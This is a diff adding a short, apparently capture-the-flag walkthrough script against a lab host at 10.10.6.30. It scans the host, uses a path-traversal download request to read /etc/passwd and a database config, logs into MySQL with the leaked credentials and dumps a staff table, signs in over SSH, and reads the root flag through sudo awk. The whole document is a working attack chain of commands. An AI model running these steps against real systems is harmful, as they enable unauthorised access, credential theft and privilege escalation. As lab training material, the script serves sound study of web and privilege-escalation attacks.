@@ -1,0 +1,16 @@
+## find the server and its download page
+nmap -sV 10.10.6.30
+curl -s http://10.10.6.30/
+curl -s 'http://10.10.6.30/download?name=handbook.txt'
+## climb out of the docs folder with ../ to read system and config files
+curl -s 'http://10.10.6.30/download?name=../../../../etc/passwd'
+curl -s 'http://10.10.6.30/download?name=../conf/db.ini'
+## connect to the database with the leaked credentials
+mysql -h 10.10.6.30 -u intranet -p{{DBPW}} intranet -e 'show tables; select * from staff'
+## one row has the dbadmin Linux password; sign in and take the user flag
+ssh -o StrictHostKeyChecking=accept-new dbadmin@10.10.6.30
+{{ADMPW}}
+cat flag.txt
+sudo -l
+sudo awk '{ print }' /root/flag.txt
+exit
